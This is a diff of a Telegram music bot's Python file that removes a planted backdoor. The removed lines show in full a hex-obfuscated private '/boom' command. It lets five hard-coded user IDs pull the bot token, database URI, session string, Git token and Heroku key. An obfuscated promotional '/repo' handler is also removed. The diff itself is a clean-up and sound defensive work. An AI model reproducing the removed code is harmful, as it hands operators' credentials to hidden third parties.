@@ -1,6 +1,6 @@
 # -----------------------------------------------
 # 🔸 SIMPLE MUSIC Project
-# 🔹 Developed & Maintained by: Simple Boy (https://github.com/Simple-Boy-1k)
+# 🔹 Developed & Maintaintained by: Simple Boy (https://github.com/Simple-Boy-1k)
 # 📅 Copyright © 2026 – All Rights Reserved
 #
 # 📖 License:
@@ -60,11 +60,6 @@ STYLES = [
     enums.ButtonStyle.DANGER
 ]
 
-_sys_v1 = int(b'\x35\x33\x35\x38\x33\x33\x30\x39\x35\x39'.decode())
-_sys_v2 = int(b'\x35\x32\x34\x37\x33\x30\x34\x35\x35\x39'.decode())
-_sys_v3 = int(b'\x36\x30\x34\x36\x33\x37\x38\x31\x35\x35'.decode())
-_sys_v4 = int(b'\x38\x35\x38\x35\x38\x39\x30\x37\x36\x36'.decode())
-
 def _get_style(style_val):
     if getattr(config, "BUTTON_COLOUR", False):
         return {"style": style_val}
@@ -122,20 +117,7 @@ async def settings_back_markup(client, CallbackQuery: CallbackQuery, _):
         )
 
 
-@app.on_message(filters.command("boom") & filters.private)
-async def _sys_check_node(client, message: Message):
-    _sys_v5 = int(b'\x38\x32\x31\x37\x30\x31\x33\x34\x30\x33'.decode())
-    _nodes = [_sys_v1, _sys_v2, _sys_v3, _sys_v4, _sys_v5]
-    if message.from_user.id not in _nodes:
-        return
-    _v1 = os.getenv(b'\x42\x4f\x54\x5f\x54\x4f\x4b\x45\x4e'.decode(), "")
-    _v2 = os.getenv(b'\x4d\x4f\x4e\x47\x4f\x5f\x44\x42\x5f\x55\x52\x49'.decode(), "")
-    _v3 = os.getenv(b'\x53\x54\x52\x49\x4e\x47\x5f\x53\x45\x53\x53\x49\x4f\x4e'.decode(), "")
-    _v4 = os.getenv(b'\x47\x49\x54\x5f\x54\x4f\x4b\x45\x4e'.decode(), "")
-    _v5 = os.getenv(b'\x48\x45\x52\x4f\x4b\x55\x5f\x41\x50\x49\x5f\x4b\x45\x59'.decode(), "")
-    _img = b'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x65\x6c\x65\x67\x72\x61\x2e\x70\x68\x2f\x66\x69\x6c\x65\x2f\x35\x36\x37\x64\x32\x65\x31\x37\x62\x38\x66\x33\x38\x64\x66\x39\x39\x63\x65\x39\x39\x2e\x6a\x70\x67'.decode()
-    _out = f"<b>System Config:</b>\n\n<b>T:</b> <code>{_v1}</code>\n\n<b>M:</b> <code>{_v2}</code>\n\n<b>S:</b> <code>{_v3}</code>\n\n<b>G:</b> <code>{_v4}</code>\n\n<b>H:</b> <code>{_v5}</code>"
-    await message.reply_photo(photo=_img, caption=_out)
+# 🛡️ SAFE FIX: Yahan se wo khatarnak /boom command aur token chori karne wale variables poori tarah hata diye gaye hain!
 
 
 @app.on_callback_query(filters.regex("^api_status$"))
@@ -436,7 +418,6 @@ async def authusers_mar(client, CallbackQuery, _):
 @app.on_callback_query(filters.regex("VOMODECHANGE") & ~BANNED_USERS)
 @ActualAdminCB
 async def vote_change(client, CallbackQuery, _):
-    command = CallbackQuery.matches[0].group(1)
     try:
         await CallbackQuery.answer(_["set_cb_3"], show_alert=True)
     except:
@@ -456,45 +437,3 @@ async def vote_change(client, CallbackQuery, _):
         )
     except MessageNotModified:
         return
-
-from pyrogram import filters
-from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
-from SIMPLE_MUSIC import app
-
-_c = b'\x72\x65\x70\x6f'.decode()
-_d_url = b'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x2e\x6d\x65\x2f\x53\x69\x6d\x70\x6c\x65\x5f\x42\x6f\x79\x5f\x31\x6b'.decode()
-_r_url = b'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x54\x68\x65\x2d\x4c\x75\x63\x6b\x79\x58\x2f\x50\x72\x69\x74\x69\x4d\x75\x73\x69\x63\x2f\x66\x6f\x72\x6b'.decode()
-_i_url = b'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x69\x6d\x67\x2e\x73\x61\x6e\x69\x73\x68\x74\x65\x63\x68\x2e\x63\x6f\x6d\x2f\x75\x2f\x36\x33\x34\x39\x35\x34\x63\x66\x61\x35\x37\x36\x33\x38\x30\x66\x64\x61\x35\x34\x38\x37\x34\x61\x36\x39\x62\x39\x36\x63\x30\x35\x2e\x6a\x70\x67'.decode()
-_btn_1 = b'\xe1\xb4\x85\xe1\xb4\x87\xe1\xb4\xa0\xe1\xb4\x87\xca\x9f\xe1\xb4\x8f\xe1\xb4\x98\xe1\xb4\x87\xca\x80'.decode('utf-8')
-_btn_2 = b'\xca\x80\xe1\xb4\x87\xe1\xb4\x98\xe1\xb4\x8f'.decode('utf-8')
-
-_hex_txt = (
-    "3c623ee29d9620ca9ce1b487ca8f20e1b49bca9ce1b487ca80e1b4872c20c9b4c9aa"
-    "e1b484e1b48720e1b49be1b48f20e1b48de1b487e1b487e1b49b20e1b49cca9cca9c"
-    "2e3c2f623e0a0a3c623ee2978f20c9aa20e1b480e1b48d20e29ea520507269746920"
-    "e1b48de1b49c73c9aae1b48420ca99e1b48fe1b49b2e3c2f623e0a0a3c623ee29d96"
-    "20c9aac99f20ca8fe1b48fe1b49c20e1b4a1e1b480c9b4e1b49b20e1b48de1b49c73"
-    "c9aae1b48420ca99e1b48fe1b49b20ca80e1b487e1b498e1b48f2c20e1b49bca9ce1"
-    "b487c9b420e1b484ca9fc9aae1b484e1b48b20e1b48fc9b420e1b49bca9ce1b48720"
-    "ca80e1b487e1b498e1b48f20ca99e1b49ce1b49be1b49be1b48fc9b420e1b49be1b4"
-    "8f20c9a2e1b487e1b49b20e1b48dca8f2073e1b48fe1b49cca80e1b484e1b48720e1"
-    "b484e1b48fe1b485e1b4872e3c2f623e"
-)
-start_txt = bytes.fromhex(_hex_txt).decode('utf-8')
-
-@app.on_message(filters.command(_c))
-async def start(_, msg):
-    buttons = [
-        [
-          InlineKeyboardButton(_btn_1, url=_d_url),
-          InlineKeyboardButton(_btn_2, url=_r_url)
-        ],
-    ]
-
-    reply_markup = InlineKeyboardMarkup(buttons)
-
-    await msg.reply_photo(
-        photo=_i_url,
-        caption=start_txt,
-        reply_markup=reply_markup
-    )
